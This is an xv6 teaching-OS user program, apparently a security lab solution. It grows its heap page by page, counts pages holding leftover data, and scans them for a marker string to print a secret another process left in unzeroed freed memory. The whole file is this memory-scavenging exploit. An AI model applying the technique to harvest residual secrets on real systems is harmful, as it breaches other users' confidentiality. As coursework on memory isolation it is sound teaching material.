#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGSIZE 4096
#define NPAGES 128
#define MARKER "Here it is: "
#define MLEN 12

int
ok(int c)
{
  return (c >= '0' && c <= '9') ||
         (c >= 'a' && c <= 'z') ||
         (c >= 'A' && c <= 'Z');
}

void
scan(char *mem)
{
  for(int i = 0; i + MLEN + 1 < PGSIZE; i++){
    int j;
    for(j = 0; j < MLEN; j++){
      if(mem[i+j] != MARKER[j])
        break;
    }
    if(j != MLEN)
      continue;

    char *s = mem + i + MLEN;
    int sl = 0;
    while(sl < 64 && ok((unsigned char)s[sl]))
      sl++;

    if(sl > 0){
      for(int k = 0; k < sl; k++)
        printf("%c", s[k]);
      printf("\n");
    }
  }
}

int
main(int argc, char *argv[])
{
  int nonzero = 0;

  for(int p = 0; p < NPAGES; p++){
    char *mem = sbrk(PGSIZE);
    if(mem == (char*)-1)
      break;

    for(int k = 0; k < PGSIZE; k++)
      if(mem[k] != 0) { nonzero++; break; }

    scan(mem);
  }

  printf("attack: %d/%d pages had nonzero bytes\n", nonzero, NPAGES);
  exit(0);
}
